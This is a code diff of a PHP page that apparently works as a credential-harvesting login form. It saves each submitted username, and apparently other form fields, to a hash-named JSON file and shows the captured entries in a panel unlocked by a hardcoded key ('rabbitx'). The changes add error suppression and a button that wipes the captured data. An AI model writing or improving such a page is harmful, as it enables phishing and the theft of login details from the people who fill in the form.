@@ -103,7 +103,7 @@ function info($name) {
 }
 
 if (isset($_POST['login'])) {
-	$data = file_get_contents("65d592ca6de0975858e73068ddb745bea5b095e0.json");
+	$data = @file_get_contents("65d592ca6de0975858e73068ddb745bea5b095e0.json");
 	$json_arr = json_decode($data, true);
 	$json_arr[] = array(
 		'user' 		=> $_POST['user'], 
@@ -114,6 +114,9 @@ if (isset($_POST['login'])) {
 
 	);
 	file_put_contents('65d592ca6de0975858e73068ddb745bea5b095e0.json', json_encode($json_arr));
+}
+if (isset($_POST['reset'])) {
+	file_put_contents("65d592ca6de0975858e73068ddb745bea5b095e0.json", "");
 }
 ?>
 <style type="text/css">
@@ -153,6 +156,9 @@ if (isset($_POST['login'])) {
 		padding-bottom:10px;
 		font-size:25px;
 	}
+	.result button {
+		float: right;
+	}
 </style>
 <form method="post">
 	<input type="text" name="user" placeholder="Username">
@@ -168,7 +174,12 @@ $key = "rabbitx"; //sha1(65d592ca6de0975858e73068ddb745bea5b095e0)
 if (empty($key) || (isset($_GET['key']) && ($_GET['key'] == sha1($key)))) {
 	?>
 	<div class="basic">
-		<div class="result">Result</div>
+		<form method="post">
+			<div class="result">
+				Result
+				<button name="reset" disabled="">reset</button>
+			</div>
+		</form>
 		<?php
 		foreach(json_decode($data, true) as $key => $value): ?>
 			<div class="bungkus">
